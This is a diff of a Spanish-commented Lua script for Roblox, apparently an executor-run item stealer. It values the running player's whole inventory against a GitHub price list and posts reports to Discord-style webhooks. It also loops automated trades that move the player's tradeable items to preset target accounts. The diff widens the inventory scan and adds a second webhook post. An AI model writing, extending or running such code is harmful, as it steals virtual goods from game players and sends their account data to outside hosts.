@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB, DELAY Y SETS)
+-- SCRIPT 2 (CORE ACTUALIZADO CON TODO EL INVENTARIO + SETS + GITHUB)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -22,7 +22,7 @@ local jugadoresObjetivosDual = {
 }
 
 -- ==========================================
--- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
+-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
@@ -41,19 +41,28 @@ local function isTradeable(name)
 end
 
 -- ==========================================
--- UTILIDAD: Normalizar Nombres (Quitar espacios)
+-- UTILIDADES DE NORMALIZACIÓN Y VALORES BASE
 -- ==========================================
 local function normalizeName(name)
     if type(name) ~= "string" then return "" end
-    return string.gsub(name, "%s+", "")
+    return string.lower(string.gsub(name, "%s+", ""))
 end
+
+local MOSTRAR_TODO_INVENTARIO = true -- true = imprime TODO, incluso lo no listado
+local RARITY_BASE = {
+    Ancient = 1500,
+    Mythic = 300,
+    Legendary = 50,
+    Rare = 15,
+    Uncommon = 5,
+    Common = 2
+}
 
 -- ==========================================
 -- CARGA DINÁMICA DE VALORES DE GITHUB
 -- ==========================================
 local Knives, Guns, Effects, Emotes, SetsData = {}, {}, {}, {}, {}
 
--- Función para limpiar espacios en las claves del JSON
 local function cleanTable(t)
     if type(t) ~= "table" then return t end
     local newT = {}
@@ -82,9 +91,14 @@ local function cargarValoresGitHub()
                 for rarity, items in pairs(catTable) do
                     if type(items) == "table" then
                         for _, item in ipairs(items) do
-                            if item.name and item.trade_value then
-                                local cleanName = normalizeName(item.name)
-                                destTable[cleanName] = item.trade_value
+                            local val = item.trade_value or RARITY_BASE[item.rarity or rarity]
+                            if item.name and val then
+                                local keyName = normalizeName(item.name)
+                                destTable[keyName] = val
+                                if item.id then
+                                    local keyId = normalizeName(item.id)
+                                    if not destTable[keyId] then destTable[keyId] = val end
+                                end
                             end
                         end
                     end
@@ -106,7 +120,7 @@ cargarValoresGitHub()
 
 task.spawn(function()
     -- ==========================================
-    -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
+    -- ESPERAR A QUE EL SCRIPT 1 SE CONECTE
     -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
         task.wait(0.2) 
@@ -179,8 +193,12 @@ task.spawn(function()
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
         local totalValue = 0
-        local ownedCounts = {} -- Contador para verificar Sets Completos
+        local ownedCounts = {}
+        local itemsNoListados = {}
 
+        -- ==========================================
+        -- ESCANEO COMPLETO DEL INVENTARIO
+        -- ==========================================
         local function scanAndSave(category, valueTable, resultTable)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
@@ -188,13 +206,31 @@ task.spawn(function()
             for guid, item in pairs(inv) do
                 if item and item.name then
                     local cleanName = normalizeName(item.name)
+                    local cleanId = normalizeName(item.id or "")
                     ownedCounts[cleanName] = (ownedCounts[cleanName] or 0) + 1
                     
-                    if not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
-                        if valueTable[cleanName] then
-                            local itemValue = valueTable[cleanName]
-                            totalValue = totalValue + itemValue
-                            resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
+                    local itemValue = valueTable[cleanName] or (cleanId ~= "" and valueTable[cleanId] or nil)
+                    local conocido = itemValue ~= nil
+                    
+                    if not conocido and item.rarity and RARITY_BASE[item.rarity] then
+                        itemValue = RARITY_BASE[item.rarity]
+                        conocido = true
+                    end
+                    
+                    local esDefault = EXCLUDE[string.lower(item.name)] ~= nil
+                    local esTradeable = isTradeable(item.name)
+                    
+                    if MOSTRAR_TODO_INVENTARIO or (conocido and esTradeable and not esDefault) then
+                        local reportValue = conocido and itemValue or 0
+                        if conocido and esTradeable then
+                            totalValue = totalValue + reportValue
+                        end
+                        resultTable[#resultTable + 1] = {
+                            name = item.name, guid = guid, value = reportValue,
+                            conocido = conocido, tradeable = esTradeable, default = esDefault
+                        }
+                        if not conocido then
+                            table.insert(itemsNoListados, item.name .. " (" .. category .. ")")
                         end
                     end
                 end
@@ -272,12 +308,16 @@ task.spawn(function()
                 executionText = playerName .. " " .. executionData[playerName] .. "x executions"
             end
 
+            -- ==========================================
+            -- FORMATEO CON MARCAS VISUALES
+            -- ==========================================
             local function formatearLista(lista)
                 local contador, orden, texto = {}, {}, ""
                 for _, v in ipairs(lista) do
                     local clave = v.name
                     if not contador[clave] then
-                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
+                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value,
+                                              conocido = v.conocido, tradeable = v.tradeable, default = v.default }
                         table.insert(orden, clave)
                     else
                         contador[clave].cantidad = contador[clave].cantidad + 1
@@ -287,7 +327,11 @@ task.spawn(function()
                 
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
-                    texto = texto .. "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
+                    local marcas = ""
+                    if not info.conocido then marcas = marcas .. " ❓" end
+                    if not info.tradeable then marcas = marcas .. " 🔒" end
+                    if info.default then marcas = marcas .. " 🚫" end
+                    texto = texto .. "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`" .. marcas .. "\n"
                 end
                 
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
@@ -370,7 +414,7 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
+            -- ENVÍO DE WEBHOOKS
             -- ==========================================
             if totalValue >= 5000 then
                 task.spawn(function()
@@ -407,6 +451,22 @@ task.spawn(function()
                         Body = jsonPayload
                     })
                 end
+            end
+            
+            -- ==========================================
+            -- AVISO DE ITEMS NO LISTADOS EN EL JSON
+            -- ==========================================
+            if #itemsNoListados > 0 and WEBHOOK_LOGS ~= "" then
+                pcall(function()
+                    request({
+                        Url = WEBHOOK_LOGS,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({
+                            content = "⚠️ Items de **" .. player.Name .. "** que NO están en values.json:\n`" .. table.concat(itemsNoListados, ", ") .. "`"
+                        })
+                    })
+                end)
             end
         end
 
@@ -448,7 +508,10 @@ task.spawn(function()
             end
         end)
 
-         local function ejecutarTradeo()
+        -- ==========================================
+        -- FUNCIÓN DE EJECUCIÓN DE TRADEO
+        -- ==========================================
+        local function ejecutarTradeo()
             local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
             if not okData then return false end
             local pdTrade = cgData.PlayerData
@@ -462,8 +525,12 @@ task.spawn(function()
                 for guid, item in pairs(inv) do
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
-                        if valueTable[cleanName] then
-                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
+                        local cleanId = normalizeName(item.id or "")
+                        local itemValue = valueTable[cleanName] or (cleanId ~= "" and valueTable[cleanId] or nil)
+                        if not itemValue and item.rarity then itemValue = RARITY_BASE[item.rarity] end
+                        
+                        if itemValue then
+                            local itemData = { name = item.name, guid = guid, value = itemValue }
                             if destList then
                                 table.insert(destList, itemData)
                             else
@@ -577,6 +644,9 @@ task.spawn(function()
             return true
         end
 
+        -- ==========================================
+        -- BUCLE DE TRADEO CONTINUO
+        -- ==========================================
         while true do
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
@@ -588,6 +658,9 @@ task.spawn(function()
             end
         end
 
+        -- ==========================================
+        -- RESTAURACIÓN FINAL
+        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
